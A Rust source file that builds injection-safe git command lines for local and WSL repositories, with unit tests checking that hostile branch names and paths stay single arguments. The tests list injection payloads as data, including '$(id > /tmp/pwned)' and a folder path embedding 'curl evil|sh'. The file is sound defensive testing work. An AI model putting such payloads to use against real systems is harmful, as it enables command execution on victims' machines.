//! Git command lines. **Argv in, argv out.**
//!
//! Every git invocation is composed from elements and quoted per element
//! ([`crate::argv::join_argv`]); the process is exec'd directly. This is a security boundary,
//! found in the v0.8.0 pre-release review: branch names (git ref names legally contain
//! `$ ( ) ; & |` and backticks) and working-folder paths (reached unattended by the git poll)
//! used to be interpolated into a line that `wsl.exe -- ...` ran through the distro's login
//! shell, so opening a hostile repository was command execution.

use crate::argv::join_argv;
use crate::winpath;
use crate::wsl;

/// ASCII Record Separator, printed by the login shell immediately before it execs git.
/// Everything up to and including it is profile noise, not git output.
///
/// Written with escapes on purpose: a literal 0x1E is invisible to tooling and one "cleanup"
/// from silently making `status --porcelain` non-empty (every WSL repo dirty forever).
pub const WSL_OUTPUT_SENTINEL: &str = "\u{1e}CSM-GIT\u{1e}";

/// The fixed script handed to `sh -lc`. It contains **no interpolated data**; that is the
/// entire basis of the injection safety, so it is a constant, not a format string. Every
/// untrusted value arrives as a positional parameter, which `"$0"` / `"$@"` expand verbatim
/// without re-parsing.
///
/// The sentinel exists because `-l` sources `/etc/profile` and `~/.profile` first, and a
/// profile that echoes prepends its output to git's. Callers parse that output: a banner would
/// become the "branch name" and make `status --porcelain` non-empty.
pub const WSL_GIT_SCRIPT: &str = r#"printf '\036CSM-GIT\036'; exec "$0" "$@""#;

/// Strips profile output emitted before the sentinel. No sentinel means the command never
/// reached the exec (wsl.exe itself failed, distro missing), so the text is an error message
/// and is returned untouched for the caller to log. Only the first marker splits.
#[must_use]
pub fn strip_wsl_profile_noise(stdout: &str) -> &str {
    match stdout.find(WSL_OUTPUT_SENTINEL) {
        Some(i) => stdout.get(i + WSL_OUTPUT_SENTINEL.len()..).unwrap_or(""),
        None => stdout,
    }
}

/// The `wsl.exe` command line for one git invocation inside a distro:
/// `-d <distro> -e sh -lc '<fixed script>' git -C <cwd> <args...>`.
///
/// `-e` execs `sh` directly (never `--`, which hands the tail to the default login shell).
/// `sh -lc` rather than a bare `-e git` because a bare exec skips the login shell, where
/// `~/.local/bin`, nix, asdf, pipx and linuxbrew enter PATH, so those users would silently lose
/// WSL git, reported as "not a git repo". Verified against a real distro: `exec` preserves
/// git's exit code, arguments starting with `-` pass through as data, and a clean profile adds
/// nothing to stdout.
///
/// Each git argument that is a `\\wsl$\<this distro>\...` UNC is translated to its Linux path.
#[must_use]
pub fn build_wsl_git_command_line(distro: &str, cwd: &str, git_args: &[&str]) -> String {
    let mut argv: Vec<String> =
        vec!["-d".into(), distro.into(), "-e".into(), "sh".into(), "-lc".into(), WSL_GIT_SCRIPT.into(), "git".into(), "-C".into(), cwd.into()];
    argv.extend(git_args.iter().map(|a| translate_unc_arg_to_linux(a, distro)));
    join_argv(&argv)
}

/// The local git command line: `-C <dir> <args...>`.
#[must_use]
pub fn build_local_git_command_line(working_dir: &str, git_args: &[&str]) -> String {
    let mut argv: Vec<&str> = vec!["-C", working_dir];
    argv.extend_from_slice(git_args);
    join_argv(&argv)
}

/// Translates ONE argument: a `\\wsl$\<distro>\...` path becomes its Linux equivalent; anything
/// else is returned unchanged. A UNC belonging to a *different* distro is passed through
/// untouched, so the caller sees the eventual "no such directory" rather than silently aiming
/// at the wrong tree. The distro match is whole-name (`Ubuntu` never matches `Ubuntu-22.04`).
#[must_use]
pub fn translate_unc_arg_to_linux(argument: &str, distro: &str) -> String {
    if argument.is_empty() {
        return String::new();
    }
    let (parsed, linux) = wsl::try_parse_unc_path(argument);
    match parsed {
        Some(d) if winpath::eq_ic(&d, distro) => {
            if linux.is_empty() {
                "/".to_string()
            } else {
                linux
            }
        }
        _ => argument.to_string(),
    }
}

/// Replaces absolute Linux paths in `text` (typically git stdout) with `\\wsl$\<distro>\...`
/// equivalents so callers see Windows-shaped paths.
///
/// Conservative: a path is only recognised at the start of a line or after whitespace, `=` or
/// `:`, and runs to the end of the line, stopping at a quote, `<`, `>` or `|`. The tail used to
/// stop at whitespace, which mangled `/home/alice/My Projects/proj`. Our callers (rev-parse,
/// `worktree list --porcelain`) always emit the path as the remainder of the line.
///
/// (Hand-written equivalent of `(^|[\s=:])(/[^\r\n'"<>|]+)` in multiline mode.)
#[must_use]
pub fn translate_linux_paths_to_unc(text: &str, distro: &str) -> String {
    if text.is_empty() {
        return String::new();
    }
    let chars: Vec<char> = text.chars().collect();
    let stops = |c: char| matches!(c, '\r' | '\n' | '\'' | '"' | '<' | '>' | '|');
    let mut out = String::with_capacity(text.len() + 16);
    let mut i = 0usize;
    while let Some(&c) = chars.get(i) {
        let boundary = i == 0 || chars.get(i - 1).is_some_and(|&p| p.is_whitespace() || p == '=' || p == ':');
        if c == '/' && boundary {
            let tail_len = chars.iter().skip(i + 1).take_while(|&&t| !stops(t)).count();
            if tail_len > 0 {
                let path: String = chars.iter().skip(i).take(tail_len + 1).collect();
                out.push_str(&format!(r"\\wsl$\{distro}"));
                out.push_str(&path.replace('/', "\\"));
                i += tail_len + 1;
                continue;
            }
        }
        out.push(c);
        i += 1;
    }
    out
}

/// Environment for every git we spawn.
///
/// `GIT_TERMINAL_PROMPT=0`: git runs with no console, so a credential prompt would wait for
/// input that can never arrive until the timeout kills it; with it git fails at once with
/// "terminal prompts disabled". `GIT_OPTIONAL_LOCKS=0` for read-only calls: a plain `git
/// status` opportunistically takes `index.lock`, which is how a background poll makes a git
/// command the user (or Claude) runs at the same moment fail.
#[must_use]
pub fn git_environment(read_only: bool) -> Vec<(&'static str, &'static str)> {
    let mut env = vec![("GIT_TERMINAL_PROMPT", "0")];
    if read_only {
        env.push(("GIT_OPTIONAL_LOCKS", "0"));
    }
    env
}

/// `WSLENV` with `names` added. Windows environment variables only cross into a distro when
/// `WSLENV` lists them. Existing entries (and their `/p`-style flags) are kept.
#[must_use]
pub fn merge_wsl_env(existing: Option<&str>, names: &[&str]) -> String {
    let mut list: Vec<String> = existing.unwrap_or("").split(':').filter(|s| !s.is_empty()).map(str::to_string).collect();
    for n in names {
        let present = list.iter().any(|e| e.split('/').next().unwrap_or("") == *n);
        if !present {
            list.push((*n).to_string());
        }
    }
    list.join(":")
}

// ── Fixed argv shapes for the toolbar operations ───────────────────────────────────────────
// Each one keeps repo-controlled values as ONE element, after `--` where git permits it.

/// The poll/menu status call: one spawn feeds branch, upstream, ahead/behind and changes.
#[must_use]
pub fn status_args() -> Vec<String> {
    ["-c", "core.quotePath=false", "status", "--porcelain=v2", "--branch"].map(String::from).to_vec()
}

/// `git fetch`.
#[must_use]
pub fn fetch_args() -> Vec<String> {
    vec!["fetch".to_string()]
}

/// `git pull --ff-only --no-rebase`: moves the branch only when that loses nothing.
/// `--no-rebase` is belt and braces against `pull.rebase=true` turning a one-click pull into a
/// rebase of local commits (git 2.54 already lets `--ff-only` win; how they interact has
/// changed across versions, and the flag costs nothing).
#[must_use]
pub fn pull_ff_only_args() -> Vec<String> {
    ["pull", "--ff-only", "--no-rebase"].map(String::from).to_vec()
}

/// `git switch --no-guess -- <branch>`. A ref can legally be called `-x`: `--` keeps it a
/// branch name; `--no-guess` stops git silently creating a tracking branch for a name that
/// exists only on a remote.
#[must_use]
pub fn switch_args(branch: &str) -> Vec<String> {
    vec!["switch".into(), "--no-guess".into(), "--".into(), branch.into()]
}

/// Human-readable `git status` for the panel.
#[must_use]
pub fn status_text_args() -> Vec<String> {
    ["-c", "color.status=false", "status"].map(String::from).to_vec()
}

/// `git worktree remove -- <path>`, deliberately WITHOUT `--force`: git then refuses a
/// worktree with modified or untracked files, and a locked one.
#[must_use]
pub fn remove_worktree_args(worktree_path: &str) -> Vec<String> {
    vec!["worktree".into(), "remove".into(), "--".into(), worktree_path.into()]
}

/// `git branch -d -- <branch>`: lower-case `-d`, so git refuses an unmerged branch.
#[must_use]
pub fn delete_merged_branch_args(branch: &str) -> Vec<String> {
    vec!["branch".into(), "-d".into(), "--".into(), branch.into()]
}

/// `git worktree prune`: only ever removes git's own bookkeeping, never a working tree.
#[must_use]
pub fn prune_worktrees_args() -> Vec<String> {
    vec!["worktree".to_string(), "prune".to_string()]
}

/// `git worktree list --porcelain`.
#[must_use]
pub fn list_worktrees_args() -> Vec<String> {
    ["worktree", "list", "--porcelain"].map(String::from).to_vec()
}

/// Local branches by name (`--format=%(refname:short)` is a bash syntax error under a login
/// shell, which is why this could never have worked with the old `--` WSL form).
#[must_use]
pub fn list_branches_args() -> Vec<String> {
    ["for-each-ref", "--format=%(refname:short)", "refs/heads"].map(String::from).to_vec()
}

/// `git rev-parse --git-common-dir`: identical for every worktree of one repo.
#[must_use]
pub fn git_common_dir_args() -> Vec<String> {
    ["rev-parse", "--git-common-dir"].map(String::from).to_vec()
}

/// `git worktree add`, either with a new branch (`-b`) or pointing at an existing ref.
/// `--` terminates option parsing before positionals: git uses permuting `parse_options`, so a
/// ref legitimately named `--force` sitting in `refs/heads` would otherwise be consumed as an
/// option. Not execution, but a repo deciding which git flags we run.
#[must_use]
pub fn worktree_add_args(target_path: &str, branch_or_ref: &str, create_branch: bool) -> Vec<String> {
    if create_branch {
        vec!["worktree".into(), "add".into(), "-b".into(), branch_or_ref.into(), "--".into(), target_path.into()]
    } else {
        vec!["worktree".into(), "add".into(), "--".into(), target_path.into(), branch_or_ref.into()]
    }
}

/// Splits `for-each-ref` output into branch names (blank lines dropped, CR tolerated).
#[must_use]
pub fn parse_branch_list(raw: &str) -> Vec<String> {
    raw.replace('\r', "").split('\n').filter(|l| !l.is_empty()).map(str::to_string).collect()
}

/// Turns `rev-parse --git-common-dir` output into the main working tree's root, with forward
/// slashes and no trailing separator.
///
/// git prints a path relative to the cwd from the main worktree (`.git`) but an absolute one
/// from a linked worktree, and under WSL that absolute path is a *Linux* path. A Linux-absolute
/// result for a WSL folder is mapped to the UNC form unconditionally; otherwise two worktrees of
/// one repo could get different busy-slot keys (#181).
#[must_use]
pub fn repo_root_from_common_dir(common_dir: Option<&str>, folder_path: &str) -> Option<String> {
    let trimmed = common_dir?.trim();
    if trimmed.is_empty() {
        return None;
    }
    let (distro, _) = wsl::try_parse_unc_path(folder_path);
    let absolute = match distro {
        Some(d) if trimmed.starts_with('/') => wsl::to_unc_path(&d, trimmed),
        _ => {
            // git may return a path relative to the cwd (".git" for a plain repo) or an
            // absolute one ("C:/repo/.git" from a worktree).
            if winpath::is_rooted(trimmed) { trimmed.to_string() } else { winpath::get_full_path(trimmed, folder_path) }
        }
    };

    // Strip the trailing ".git" segment to get the working tree root.
    let mut normalized = absolute.replace('\\', "/").trim_end_matches('/').to_string();
    if winpath::ends_with_ic(&normalized, "/.git") {
        normalized.truncate(normalized.len() - "/.git".len());
    } else if winpath::ends_with_ic(&normalized, ".git") {
        normalized.truncate(normalized.len() - ".git".len());
        normalized = normalized.trim_end_matches('/').to_string();
    }
    if normalized.is_empty() { None } else { Some(normalized) }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::argv::split_command_line;

    // Payloads that would execute, or split an argument, if they ever reached a shell or were
    // concatenated unquoted. All are legal git ref names or legal Linux directory names.
    const HOSTILE: [&str; 11] = [
        "$(id > /tmp/pwned)",
        "`id`",
        "a;id",
        "a|id",
        "a&&id",
        "a b",  // plain split
        "a\"b", // quote: this is what broke the local path
        r"a\b",
        r"trailing\\", // backslash run before the closing quote
        "$IFS",
        "a\nb",
    ];

    /// The argv from `git` onwards: what the distro's git actually receives, ignoring the
    /// wsl.exe preamble. Position-independent so a preamble change does not need every
    /// expectation rewritten.
    fn git_argv(command_line: &str) -> Vec<String> {
        let argv = split_command_line(command_line);
        let g = argv.iter().position(|a| a == "git").unwrap_or_else(|| panic!("no `git` in: {command_line}"));
        argv[g..].to_vec()
    }

    fn strs(v: &[&str]) -> Vec<String> {
        v.iter().map(|s| (*s).to_string()).collect()
    }

    // ── GitServiceInjectionTests ───────────────────────────────────────────────────────

    #[test]
    fn wsl_git_command_line_keeps_each_value_as_exactly_one_argument() {
        for payload in HOSTILE {
            let cmd = build_wsl_git_command_line("Ubuntu", "/home/alice/repo", &["worktree", "add", "-b", payload, "--", "/home/alice/wt"]);
            assert_eq!(
                git_argv(&cmd),
                strs(&["git", "-C", "/home/alice/repo", "worktree", "add", "-b", payload, "--", "/home/alice/wt"]),
                "{payload:?}"
            );
        }
    }

    #[test]
    fn local_git_command_line_keeps_each_value_as_exactly_one_argument() {
        for payload in HOSTILE {
            let cmd = build_local_git_command_line(r"C:\repo", &["worktree", "add", "-b", payload, r"C:\wt"]);
            assert_eq!(split_command_line(&cmd), strs(&["-C", r"C:\repo", "worktree", "add", "-b", payload, r"C:\wt"]), "{payload:?}");
        }
    }

    #[test]
    fn wsl_git_command_line_uses_dash_e_not_dash_dash() {
        // The whole fix. `--` hands the tail to the distro's login shell; `-e` execs the named
        // program directly. If this regresses, every payload above becomes live again.
        let cmd = build_wsl_git_command_line("Ubuntu", "/repo", &["status", "--porcelain"]);
        let argv = split_command_line(&cmd);
        assert_eq!(argv[2], "-e");
        let git = argv.iter().position(|a| a == "git").unwrap();
        // No bare `--` may appear in the wsl.exe option section (before the program).
        assert!(!argv[..git].iter().any(|a| a == "--"));
    }

    #[test]
    fn wsl_git_command_line_runs_git_through_a_login_shell_without_reparsing() {
        // A bare `-e git` is injection-safe but drops the login shell, so PATH is the bare
        // default and nix/asdf/linuxbrew users silently lose WSL git. `-e sh -lc 'exec "$0"
        // "$@"' git ...` gets the login PATH back: the script is a FIXED LITERAL and every
        // untrusted value arrives as a positional parameter.
        let cmd = build_wsl_git_command_line("Ubuntu", "/repo", &["status"]);
        let argv = split_command_line(&cmd);
        let e = argv.iter().position(|a| a == "-e").unwrap();
        assert_eq!(argv[e + 1], "sh");
        assert_eq!(argv[e + 2], "-lc");
        // The script must contain no interpolated data, only positional expansion.
        assert_eq!(argv[e + 3], WSL_GIT_SCRIPT);
        assert_eq!(argv[e + 4], "git");
    }

    #[test]
    fn the_shell_script_is_always_the_same_literal() {
        // The safety of the -lc form rests entirely on the script never varying with input.
        for payload in HOSTILE {
            let cmd = build_wsl_git_command_line("Ubuntu", payload, &["worktree", "add", "-b", payload, "--", payload]);
            let argv = split_command_line(&cmd);
            assert_eq!(argv.iter().filter(|a| *a == WSL_GIT_SCRIPT).count(), 1);
            let lc = argv.iter().position(|a| a == "-lc").unwrap();
            assert_eq!(argv[lc + 1], WSL_GIT_SCRIPT);
        }
    }

    #[test]
    fn profile_noise_before_the_sentinel_is_stripped() {
        // `sh -l` sources /etc/profile and ~/.profile before running anything. A profile that
        // echoes would otherwise become the "branch name", and make `status --porcelain`
        // non-empty, pinning every WSL repo to dirty forever.
        let with_banner = format!("Welcome to Ubuntu\nsome motd{WSL_OUTPUT_SENTINEL}main\n");
        assert_eq!(strip_wsl_profile_noise(&with_banner), "main\n");
    }

    #[test]
    fn everything_after_the_marker_is_kept() {
        assert_eq!(strip_wsl_profile_noise(&format!("{WSL_OUTPUT_SENTINEL}main\n")), "main\n");
    }

    #[test]
    fn output_with_no_sentinel_is_returned_intact() {
        // No marker means the exec never happened: wsl.exe itself failed, the distro is
        // missing. That text is an error message the caller logs, not git output to trim.
        let wsl_error = "There is no distribution with the supplied name.";
        assert_eq!(strip_wsl_profile_noise(wsl_error), wsl_error);
        assert_eq!(strip_wsl_profile_noise(""), "");
    }

    #[test]
    fn only_the_first_marker_splits() {
        let s = format!("noise{WSL_OUTPUT_SENTINEL}real");
        assert_eq!(strip_wsl_profile_noise(&s), "real");
        let twice = format!("a{WSL_OUTPUT_SENTINEL}b{WSL_OUTPUT_SENTINEL}c");
        assert_eq!(strip_wsl_profile_noise(&twice), format!("b{WSL_OUTPUT_SENTINEL}c"));
    }

    #[test]
    fn status_porcelain_stays_empty_when_a_profile_is_chatty() {
        // Empty porcelain output means "clean". A banner would make it non-empty and every
        // WSL repo would show as dirty forever.
        let stdout = format!("MOTD line one\nMOTD line two\n{WSL_OUTPUT_SENTINEL}");
        assert!(strip_wsl_profile_noise(&stdout).trim().is_empty());
    }

    #[test]
    fn the_script_handed_to_the_login_shell_is_free_of_interpolated_data() {
        let a = build_wsl_git_command_line("Ubuntu", "/a", &["status"]);
        let b = build_wsl_git_command_line("Debian", "/b$(id)", &["log", "`id`"]);
        let script_of = |cmd: &str| {
            let argv = split_command_line(cmd);
            argv[argv.iter().position(|x| x == "-lc").unwrap() + 1].clone()
        };
        assert_eq!(script_of(&a), script_of(&b));
        assert!(!script_of(&b).contains("id"));
    }

    #[test]
    fn worktree_add_terminates_option_parsing_before_positionals() {
        // git uses permuting parse_options, so a ref legitimately named `--force` sitting in
        // refs/heads would otherwise be consumed as an option rather than a commit-ish.
        let cmd = build_local_git_command_line(r"C:\repo", &["worktree", "add", "--", r"C:\wt", "--force"]);
        let argv = split_command_line(&cmd);
        let dash_dash = argv.iter().position(|a| a == "--").unwrap();
        let hostile_ref = argv.iter().position(|a| a == "--force").unwrap();
        assert!(dash_dash < hostile_ref, "the option terminator must precede any repo-controlled positional");
    }

    #[test]
    fn worktree_add_args_put_the_separator_before_every_positional() {
        for hostile in ["--force", "-x", "$(id)", "a b", "a\"b", "--detach"] {
            let with_branch = worktree_add_args(r"C:\wt", hostile, true);
            assert_eq!(with_branch, strs(&["worktree", "add", "-b", hostile, "--", r"C:\wt"]));
            let existing = worktree_add_args(r"C:\wt", hostile, false);
            assert_eq!(existing, strs(&["worktree", "add", "--", r"C:\wt", hostile]));
        }
    }

    #[test]
    fn wsl_git_command_line_hostile_working_folder_stays_one_argument() {
        // The unattended half: cwd comes from the session's working folder and is reached by
        // the git poll on a timer, with no user action at all.
        let cmd = build_wsl_git_command_line("Ubuntu", "/home/alice/proj$(curl evil|sh)", &["status", "--porcelain"]);
        assert_eq!(git_argv(&cmd), strs(&["git", "-C", "/home/alice/proj$(curl evil|sh)", "status", "--porcelain"]));
    }

    #[test]
    fn wsl_git_command_line_hostile_distro_name_stays_one_argument() {
        let cmd = build_wsl_git_command_line("Ubuntu 22.04$(id)", "/repo", &["status"]);
        assert_eq!(split_command_line(&cmd)[1], "Ubuntu 22.04$(id)");
    }

    #[test]
    fn for_each_ref_format_survives_as_one_argument() {
        let cmd = build_wsl_git_command_line("Ubuntu", "/repo", &["for-each-ref", "--format=%(refname:short)", "refs/heads"]);
        assert_eq!(git_argv(&cmd), strs(&["git", "-C", "/repo", "for-each-ref", "--format=%(refname:short)", "refs/heads"]));
        assert_eq!(list_branches_args()[1], "--format=%(refname:short)");
    }

    #[test]
    fn wsl_git_command_line_translates_unc_arguments_per_argument() {
        let cmd = build_wsl_git_command_line("Ubuntu", "/repo", &["worktree", "add", r"\\wsl$\Ubuntu\home\alice\my repo"]);
        let argv = split_command_line(&cmd);
        assert_eq!(argv.last().unwrap(), "/home/alice/my repo");
    }

    #[test]
    fn the_sentinel_and_the_script_agree_on_the_marker_bytes() {
        // The constant used to hold RAW 0x1E bytes that file reads normalised away. This pins
        // it against what the shell script actually prints so drift fails here, not in the
        // field.
        let s = WSL_OUTPUT_SENTINEL;
        assert_eq!(s.chars().next(), Some('\u{1e}'));
        assert_eq!(s.chars().last(), Some('\u{1e}'));
        assert_eq!(&s[1..s.len() - 1], "CSM-GIT");
        // printf's octal 036 is 0x1E: one on each side of the same text.
        assert!(WSL_GIT_SCRIPT.contains("036CSM-GIT"));
        assert_eq!(WSL_GIT_SCRIPT.matches("036").count(), 2);
    }

    #[test]
    fn the_sentinel_is_not_whitespace() {
        // The failure mode if a byte ever leaks through the strip: is_empty-after-trim is
        // false for 0x1E, so a clean repo would be reported as dirty.
        assert!(!WSL_OUTPUT_SENTINEL.trim().is_empty());
        assert_eq!(strip_wsl_profile_noise(WSL_OUTPUT_SENTINEL), "");
    }

    // ── GitToolsArgvTests ──────────────────────────────────────────────────────────────

    #[test]
    fn switch_keeps_the_branch_one_argument_after_the_separator() {
        for branch in ["-x", "--force", "$(id)", "a\"b", "feature/with space"] {
            let sw = switch_args(branch);
            let refs: Vec<&str> = sw.iter().map(String::as_str).collect();
            let cmd = build_local_git_command_line(r"C:\repo", &refs);
            let argv = split_command_line(&format!("git {cmd}"));
            assert_eq!(argv, strs(&["git", "-C", r"C:\repo", "switch", "--no-guess", "--", branch]));
        }
    }

    #[test]
    fn wsl_env_gains_the_git_variables_once_and_keeps_existing_entries() {
        assert_eq!(merge_wsl_env(None, &["GIT_TERMINAL_PROMPT", "GIT_OPTIONAL_LOCKS"]), "GIT_TERMINAL_PROMPT:GIT_OPTIONAL_LOCKS");
        assert_eq!(merge_wsl_env(Some("USERPROFILE/p"), &["GIT_TERMINAL_PROMPT"]), "USERPROFILE/p:GIT_TERMINAL_PROMPT");
        assert_eq!(merge_wsl_env(Some("GIT_TERMINAL_PROMPT/u"), &["GIT_TERMINAL_PROMPT"]), "GIT_TERMINAL_PROMPT/u");
    }

    #[test]
    fn every_git_never_prompts_and_reads_skip_optional_locks() {
        assert!(git_environment(false).contains(&("GIT_TERMINAL_PROMPT", "0")));
        assert!(!git_environment(false).iter().any(|(k, _)| *k == "GIT_OPTIONAL_LOCKS"));
        assert!(git_environment(true).contains(&("GIT_OPTIONAL_LOCKS", "0")));
    }

    #[test]
    fn remove_and_branch_delete_argv_keep_values_as_one_element_after_dashdash() {
        for hostile in ["-x", "--force", "$(id)", "a b", "a\"b"] {
            assert_eq!(remove_worktree_args(hostile), strs(&["worktree", "remove", "--", hostile]));
            assert_eq!(delete_merged_branch_args(hostile), strs(&["branch", "-d", "--", hostile]));
        }
    }

    #[test]
    fn fixed_argv_shapes() {
        assert_eq!(status_args(), strs(&["-c", "core.quotePath=false", "status", "--porcelain=v2", "--branch"]));
        assert_eq!(pull_ff_only_args(), strs(&["pull", "--ff-only", "--no-rebase"]));
        assert_eq!(fetch_args(), strs(&["fetch"]));
        assert_eq!(prune_worktrees_args(), strs(&["worktree", "prune"]));
        assert_eq!(list_worktrees_args(), strs(&["worktree", "list", "--porcelain"]));
        assert_eq!(status_text_args(), strs(&["-c", "color.status=false", "status"]));
        // never --force, never -D
        assert!(!remove_worktree_args("x").contains(&"--force".to_string()));
        assert!(!delete_merged_branch_args("x").contains(&"-D".to_string()));
    }

    #[test]
    fn branch_list_parsing() {
        assert_eq!(parse_branch_list("main\r\nfeat/x\n\n"), strs(&["main", "feat/x"]));
        assert!(parse_branch_list("").is_empty());
    }

    // ── GitServiceWslRoutingTests ──────────────────────────────────────────────────────

    #[test]
    fn try_parse_wsl_unc_known_shapes() {
        for (path, distro, linux) in [
            (r"\\wsl$\Ubuntu\home\alice", Some("Ubuntu"), "/home/alice"),
            (r"\\wsl.localhost\Debian\srv\app", Some("Debian"), "/srv/app"),
            (r"\\wsl$\Ubuntu", Some("Ubuntu"), "/"),
            (r"C:\proj", None, ""),
            ("", None, ""),
        ] {
            let (d, l) = wsl::try_parse_unc_path(path);
            assert_eq!(d.as_deref(), distro);
            assert_eq!(l, linux);
        }
    }

    #[test]
    fn translate_unc_arg_matching_distro_substitutes() {
        assert_eq!(translate_unc_arg_to_linux(r"\\wsl$\Ubuntu\home\alice\proj-foo", "Ubuntu"), "/home/alice/proj-foo");
    }

    #[test]
    fn translate_unc_arg_different_distro_left_alone() {
        // We're running git inside Ubuntu: a UNC pointing at Debian is a real mistake and
        // should NOT be silently rewritten to look like a local path.
        let arg = r"\\wsl$\Debian\home\alice\proj";
        assert_eq!(translate_unc_arg_to_linux(arg, "Ubuntu"), arg);
    }

    #[test]
    fn translate_unc_arg_non_path_args_pass_through() {
        assert_eq!(translate_unc_arg_to_linux("--show-current", "Ubuntu"), "--show-current");
        assert_eq!(translate_unc_arg_to_linux("branch", "Ubuntu"), "branch");
        assert_eq!(translate_unc_arg_to_linux("", "Ubuntu"), "");
    }

    #[test]
    fn translate_linux_paths_rev_parse_output() {
        let t = translate_linux_paths_to_unc("/home/alice/proj/.git\n", "Ubuntu");
        assert!(t.contains(r"\\wsl$\Ubuntu\home\alice\proj\.git"), "{t}");
        assert!(t.ends_with('\n'));
    }

    #[test]
    fn translate_linux_paths_worktree_list_porcelain() {
        // Only the `worktree /...` lines carry absolute paths; the rest (HEAD sha,
        // refs/heads/x) must NOT be mangled.
        let raw = "worktree /home/alice/proj\nHEAD abc123\nbranch refs/heads/main\n";
        let t = translate_linux_paths_to_unc(raw, "Ubuntu");
        assert!(t.contains(r"worktree \\wsl$\Ubuntu\home\alice\proj"));
        assert!(t.contains("HEAD abc123"));
        assert!(t.contains("branch refs/heads/main"));
    }

    #[test]
    fn translate_linux_paths_branch_name_with_slash_not_mangled() {
        // refs/heads/feature/foo starts with 'r', not '/': must pass through.
        let raw = "feature/wsl-sessions\n";
        assert_eq!(translate_linux_paths_to_unc(raw, "Ubuntu"), raw);
    }

    #[test]
    fn translate_linux_paths_status_porcelain_untouched() {
        let raw = "M README.md\n?? new.txt\n";
        assert_eq!(translate_linux_paths_to_unc(raw, "Ubuntu"), raw);
    }

    #[test]
    fn translate_unc_arg_path_with_spaces_translated_whole() {
        assert_eq!(translate_unc_arg_to_linux(r"\\wsl$\Ubuntu\home\alice\my repo", "Ubuntu"), "/home/alice/my repo");
    }

    #[test]
    fn translate_unc_arg_distro_root_becomes_slash() {
        assert_eq!(translate_unc_arg_to_linux(r"\\wsl$\Ubuntu", "Ubuntu"), "/");
    }

    #[test]
    fn translate_linux_paths_path_contains_spaces_translates_whole_path() {
        // The tail used to stop at the first whitespace, so a path with a space got
        // half-translated.
        let raw = "worktree /home/alice/My Projects/repo\n";
        let t = translate_linux_paths_to_unc(raw, "Ubuntu");
        assert!(t.contains(r"\\wsl$\Ubuntu\home\alice\My Projects\repo"), "{t}");
        assert!(!t.contains("Projects/repo")); // no leftover forward slashes
    }

    #[test]
    fn translate_unc_arg_prefix_colliding_distro_left_alone() {
        // `Ubuntu` must not match `Ubuntu-22.04`, the default `wsl --install` naming.
        let arg = r"\\wsl$\Ubuntu-22.04\home\alice\x";
        assert_eq!(translate_unc_arg_to_linux(arg, "Ubuntu"), arg);
    }

    #[test]
    fn translate_unc_arg_case_insensitive_distro_match() {
        assert_eq!(translate_unc_arg_to_linux(r"\\wsl$\ubuntu\home\alice", "Ubuntu"), "/home/alice");
    }

    #[test]
    fn translate_linux_paths_stops_at_quotes_and_pipes_and_needs_a_boundary() {
        // equivalent of the regex tail class
        assert_eq!(translate_linux_paths_to_unc("x=/a/b'c", "D"), r"x=\\wsl$\D\a\b'c");
        assert_eq!(translate_linux_paths_to_unc("a/b", "D"), "a/b");
        assert_eq!(translate_linux_paths_to_unc("/", "D"), "/");
        assert_eq!(translate_linux_paths_to_unc("p:/a|/b", "D"), r"p:\\wsl$\D\a|/b");
        // consecutive lines each qualify
        assert_eq!(translate_linux_paths_to_unc("/a\r\n/b", "D"), "\\\\wsl$\\D\\a\r\n\\\\wsl$\\D\\b");
        // non-ASCII is carried through intact
        assert_eq!(translate_linux_paths_to_unc("/é ü", "D"), "\\\\wsl$\\D\\é ü");
    }

    // ── repo root from `rev-parse --git-common-dir` (#181) ─────────────────────────────

    #[test]
    fn repo_root_wsl_main_and_linked_worktree_share_one_busy_key() {
        use crate::git::worktrees::busy_key;
        // Main checkout: git answers relative to the cwd.
        let main = repo_root_from_common_dir(Some(".git\n"), r"\\wsl$\Ubuntu\home\u\repo");
        // Linked worktree, Linux-absolute (as git prints it inside the distro).
        let linked_raw = repo_root_from_common_dir(Some("/home/u/repo/.git\n"), r"\\wsl$\Ubuntu\home\u\repo-wt");
        // Linked worktree, already mapped to UNC by the stdout translation.
        let linked_unc = repo_root_from_common_dir(Some(r"\\wsl$\Ubuntu\home\u\repo\.git"), r"\\wsl.localhost\Ubuntu\home\u\repo-wt");

        assert_eq!(main.as_deref(), Some("//wsl$/Ubuntu/home/u/repo"));
        assert_eq!(main, linked_raw);
        assert_eq!(main, linked_unc);
        assert_eq!(busy_key(main.as_deref(), None), busy_key(linked_raw.as_deref(), None));
    }

    #[test]
    fn repo_root_local_shapes() {
        for (common, folder, expected) in [
            (Some(".git"), r"C:\src\app", Some("C:/src/app")),
            (Some("C:/src/app/.git"), r"C:\src\app-wt", Some("C:/src/app")),
            (Some(r"C:\src\bare.git"), r"C:\src\bare.git", Some("C:/src/bare")),
            (Some(""), r"C:\src\app", None),
            (None, r"C:\src\app", None),
            (Some("   "), r"C:\src\app", None),
            (Some("../other/.git"), r"C:\src\app", Some("C:/src/other")),
        ] {
            assert_eq!(repo_root_from_common_dir(common, folder).as_deref(), expected, "{common:?} {folder}");
        }
    }
}
